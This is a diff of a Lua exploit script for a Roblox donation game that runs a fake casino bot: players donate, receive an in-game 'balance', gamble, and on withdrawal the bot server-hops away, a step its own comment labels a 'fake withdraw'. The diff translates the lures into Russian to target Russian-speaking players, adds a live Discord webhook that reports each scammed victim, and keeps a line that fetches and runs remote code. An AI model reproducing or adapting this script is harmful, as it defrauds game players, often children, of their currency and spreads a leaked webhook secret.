@@ -41,25 +41,25 @@ queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-T
 if not getgenv().settin then
 	getgenv().settin = {
 		['WebHook'] = {
-			['Webhook'] = "",
+			['Webhook'] = "https://discord.com/api/webhooks/1084196577985437859/i9snSJVnwRVnd2EbEYsI54YgT2qcW2T1H5-nh8_avS4j4oBWlhvq-Hh_Fx66cdmQM0t9",
 		},
-		['ServerHopDelay'] = 15, -- minutes, resets every donation
-		['MinimumWithdrawAmount'] = 1000, -- fake withdraw amount
+		['ServerHopDelay'] = 5, -- minutes, resets every donation
+		['MinimumWithdrawAmount'] = 30, -- fake withdraw amount
 		['Beg'] = {
-			['Delay'] = 120,
+			['Delay'] = 30,
 			['Messages'] = {
-				'💸 WIN BOBUX HERE 💸',
-				'💸 EARN BY PLAYING 💸',
-				'💸 TIRED OF NO DONATIONS? PLAY OUR GAME 💸'
+				'💸 РУЛЕТКА 💸',
+				'💸 ТОЛЬКО ДЛЯ РУССКИХ ШАНСЫ ВЫШЕ! 💸',
+				'💸 НЕ ЗАДОНАТИЛИ? СЫГРАЙ В ИГРУ! 💸'
 			}
 		}
 	}
 end
 
 local text = [[
-      💸 WIN BOBUX 💸
-    💸 GOLDEN CASINO 💸
-💸 type ".help" to get started 💸
+      💸 РУЛЕТКА 💸
+    💸 ВЫЙГРАЙ РОБАКСЫ 💸
+💸 Напиши ".help" что бы начать! 💸
 ]]
 
 local plrs = {}
@@ -108,8 +108,8 @@ function webhook(...)
 	local c = game:GetService("MarketplaceService")
 	local c = c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 	local a = {
-		["title"] = "> CF-Trail's Casino™ | **" .. Players.LocalPlayer.Name .. " got donated! :D**",
-		["description"] = "https://discord.gg/8jxEbMAEQD",
+		["title"] = "> OverCasino | **" .. Players.LocalPlayer.Name .. " лохонулся! :D**",
+		["description"] = "https://discord.gg/",
 		["type"] = "rich",
 		["color"] = tonumber(getgenv().embedcolor),
 		["thumbnail"] = {
@@ -253,12 +253,12 @@ raised:GetPropertyChangedSignal('Value'):Connect(function()
 		for i, v in next, Players:GetPlayers() do
 			if v.DisplayName == msg then
 				playerWhoDonated = v
-				chat('💸 ' .. raisedN .. ' has been added to your balance! 💸')
+				chat('💸 ' .. raisedN .. ' Добавленно на твой баланс! 💸')
 				playerWhoDonated:SetAttribute('Donated', playerWhoDonated:GetAttribute('Donated') + raisedN)
 			end
 		end
 		if not playerWhoDonated then
-		   chat('💸 Could not fetch who donated me! Please stay close to me! 💸')
+		   chat('💸 Не смог найти того, кто мне задонатил! Пожалуйста, будьте рядом со мной! 💸')
 		   task.wait(6)
 		   local players = Players:GetPlayers()
                    local closestPlayer = nil
@@ -272,10 +272,10 @@ raised:GetPropertyChangedSignal('Value'):Connect(function()
                      end
                    end
 		playerWhoDonated:SetAttribute('Donated',raisedN)
-		chat('💸 Added ' .. raisedN .. ' to ' .. playerWhoDonated.Name .. ' 💸')
+		chat('💸 Добавлено ' .. raisedN .. ' для ' .. playerWhoDonated.Name .. ' 💸')
 		end
         else
-		   chat('💸 Could not fetch who donated me! Please stay close to me! 💸')
+		   chat('💸 Не смог найти того, кто мне задонатил! Пожалуйста, будьте рядом со мной! 💸')
 		   task.wait(6)
 		   local players = Players:GetPlayers()
                    local closestPlayer = nil
@@ -311,26 +311,26 @@ msgdone.OnClientEvent:Connect(function(msgdata)
 		end
 	end
 	if message == '.balance' or message == '.bal' then
-		chat('💸 Your balance: ' .. tostring(bal) or '0' .. ' 💸')
+		chat('💸 Баланс: ' .. tostring(bal) or '0' .. ' 💸')
 		return
 	end
 	if message == '.play' then
-		chat('💸 You need to specify an amount! | .play amount 💸')
+		chat('💸 На сколько хочешь сыграть! | .play amount 💸')
 		return
 	end
 	if string.match(message, '.play ') then
 		local slotValx = string.gsub(message, '.play ', '')
 		if not tonumber(slotValx) or tonumber(slotValx) < 0 then
-			chat('💸 Enter a valid amount! | .play amount 💸')
+			chat('💸 На сколько хочешь сыграть! | .play amount 💸')
 			return
 		end
 		local slotVal = tonumber(slotValx)
 		if bal == 0 then
-			chat('💸 Your balance is 0! You cannot play! 💸')
+			chat('💸 У тебя нет денег! Ты не можешь играть! 💸')
 			return
 		end
 		if bal < slotVal then
-			chat('💸 Your balance is lower than the value you provided! 💸')
+			chat('💸 Ваш баланс ниже, чем указанное вами значение! 💸')
 			return
 		end
 		local num
@@ -341,20 +341,20 @@ msgdone.OnClientEvent:Connect(function(msgdata)
                   newBalance = 0
                 end
 		if newBalance > oldBalance then
-			chat('💸 You won! Your new balance is: ' .. newBalance .. ' 💸')
+			chat('💸 Ты выиграл! Твой баланс: ' .. newBalance .. ' 💸')
 		elseif newBalance < oldBalance then
-			chat('💸 You lost! Your new balance is: ' .. newBalance .. ' 💸')
+			chat('💸 Ты проиград! Твой баланс: ' .. newBalance .. ' 💸')
 		else
-			chat('💸 Your balance stays the same 💸')
+			chat('💸 Ты ничего не выиграл! Баланс прежний 💸')
 		end
 		plrChatted:SetAttribute('Donated', newBalance)		
 	end
     if message == '.help' then
-        chat('.help | .withdraw | .play amount | .balance || Amount of bux you donate will be sent to your balance.')
+        chat('.help - меню | .withdraw - вывести | .play (количество) - играть | .balance - баланс || Сколько задонатил столько появиться на балансе!')
     end
     if message == '.withdraw' then
         if plrChatted:GetAttribute('Donated') < getgenv().settin.MinimumWithdrawAmount then
-            chat('💸 You need to get atleast ' .. getgenv().settin.MinimumWithdrawAmount .. ' to withdraw 💸')
+            chat('💸 Тебе нужно ' .. getgenv().settin.MinimumWithdrawAmount .. ' что бы вывести 💸')
             return
         end
         serverHop()
@@ -372,29 +372,29 @@ chat(settin.Beg.Messages[math.random(1,#settin.Beg.Messages)])
 local boothText = require(game.ReplicatedStorage.Remotes).Event("SetBoothText")
 task.spawn(function()
 	while true do
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 ------💸-Golden Casino-💸  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 ------💸-РУССКОЕ-КАЗИНО-💸  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 -----💸-Golden Casino-💸-  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 -----💸-РУССКОЕ-КАЗИНО-💸-  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 ----💸-Golden Casino-💸--  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 ----💸-РУССКОЕ-КАЗИНО-💸--  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 ---💸-Golden Casino-💸---  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 ---💸-РУССКОЕ-КАЗИНО-💸---  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 --💸-Golden Casino-💸----  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 --💸-РУССКОЕ-КАЗИНО-💸----  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 -💸-Golden Casino-💸-----  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 -💸-РУССКОЕ-КАЗИНО-💸-----  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 💸-Golden Casino-💸------  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 💸-РУССКОЕ-КАЗИНО-💸------  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 -💸-Golden Casino-💸-----  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 -💸-РУССКОЕ-КАЗИНО-💸-----  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 --💸-Golden Casino-💸----  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 --💸-РУССКОЕ-КАЗИНО-💸----  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 ---💸-Golden Casino-💸---  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 ---💸-РУССКОЕ-КАЗИНО-💸---  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 ----💸-Golden Casino-💸--  💸          .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 ----💸-РУССКОЕ-КАЗИНО-💸--  💸            .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
-		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         Win Bobux!         💸 -----💸-Golden-Casino-💸-  💸         .help to play        💸</font></font></font></stroke>', "booth")
+		boothText:FireServer('<stroke color="#444444" thickness="1"><font size="9"><font color= "#FFB300"><font face="DenkOne">💸         РУЛЕТКА !         💸 -----💸-РУССКОЕ-КАЗИНО-💸-  💸           .help для играть         💸</font></font></font></stroke>', "booth")
 		task.wait(3)
 	end
 end)
